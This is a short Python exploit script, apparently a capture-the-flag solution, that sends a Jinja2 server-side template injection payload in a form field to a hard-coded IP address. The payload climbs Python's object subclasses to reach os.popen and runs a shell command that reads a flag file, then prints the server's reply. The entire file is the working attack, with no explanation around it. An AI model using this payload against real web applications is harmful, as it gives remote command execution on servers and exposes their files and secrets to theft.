#!/usr/bin/env python3

import requests
import re
import html

url = 'http://206.189.236.145:5000/'

r = requests.post(url, {
	'name': '{{"".__class__.__base__.__subclasses__()[140].__init__.__globals__["sys"].modules["os"].popen("cat /var/www/html/flag").read()}}'
	})

print(r.text)